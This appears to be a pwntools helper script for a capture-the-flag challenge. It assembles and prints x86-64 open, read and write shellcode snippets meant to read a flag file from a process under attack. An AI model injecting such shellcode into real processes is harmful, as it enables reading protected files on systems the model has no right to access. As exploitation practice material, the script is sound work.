from pwn import *

context.arch = "amd64"

# Global + 0x30 Bytes should be the Flag name Position

OpenShellCode = """
    push QWORD PTR [rip+0x2a]
    pop rdi
    push 0x02
    pop rax
    xor rsi, rsi
    xor rdx, rdx
    syscall
    ret
"""

print("Open Shell Code: (length: " + str(len(asm(OpenShellCode))) + ")")
print(OpenShellCode, end="\n\n")
print(asm(OpenShellCode))

ReadShellCode = """
    push QWORD PTR [rip+0x2a]
    pop rsi
    xor rax, rax
    push 3
    pop rdi
    push 0x40
    pop rdx
    syscall
    ret
"""

print("Read Shell Code: (length: " + str(len(asm(ReadShellCode))) + ")")
print(ReadShellCode, end="\n\n")
print(asm(ReadShellCode))

WriteShellCode = """
    push QWORD PTR [rip+0x2a]
    pop rsi
    push 1
    pop rax
    push 3
    pop rdi
    push 0x40
    pop rdx
    syscall
    ret
"""

print("Write Shell Code: (length: " + str(len(asm(WriteShellCode))) + ")")
print(WriteShellCode, end="\n\n")
print(asm(WriteShellCode))
